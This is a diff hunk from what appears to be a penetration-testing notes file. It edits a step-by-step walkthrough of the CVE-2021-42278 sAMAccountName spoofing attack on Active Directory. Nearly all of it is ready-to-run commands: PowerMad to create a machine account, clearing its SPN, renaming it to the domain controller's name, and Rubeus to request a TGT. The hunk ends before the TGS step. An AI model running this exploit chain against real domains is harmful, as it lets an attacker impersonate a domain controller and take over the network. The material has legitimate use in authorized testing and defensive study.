@@ -1159,19 +1159,28 @@ https://4sysops.com/archives/exploiting-the-cve-2021-42278-samaccountname-spoofi
 
 
 Create a machine account:
+
+```. .\PowerMad.ps1```
+
 ```New-MachineAccount -MachineAccount PC01 -Domain ecorp.lab -DomainController dc.ecorp.lab -Verbose```
 
+OR 
+
+```New-MachineAccount -MachineAccount PC01 -Password $(ConvertTo-SecureString 'Password01' -AsPlainText -Force)```
+
 Clear SPN of the machine account:
+
 ```Set-DomainObject "CN=PC01,CN=Computers,DC=ecorp,DC=lab" -Clear 'serviceprincipalname' -Verbose```
 
 _Because you have the "creator owner" access in Active Directory for that object, you can change the sAMAccountName attribute's property. Run the command below to modify that attribute to be the same as that of the domain controller name (without the $)._
 
 Modify the sAMAccountName attribute:
+
 ```Set-MachineAccountAttribute -MachineAccount PC01 -Value "DC" -Attribute sAMAccountName  -Verbose```
 
 Rubeus now requests a TGT token with the faked sAMAccountName as the username and password provided during the computer object creation process. Kerberos validates the request and provides a TGT token that can be used later:
 
-```.\Rubeus.exe asktgt /user:DC /password:12345 /domain:ecorp.lab /dc: dc.ecorp.lab /nowrap```
+```.\Rubeus.exe asktgt /user:DC /password:Password01 /domain:ecorp.lab /dc: dc.ecorp.lab /nowrap```
 
 Now set your machine account back and ask for a TGS:
 
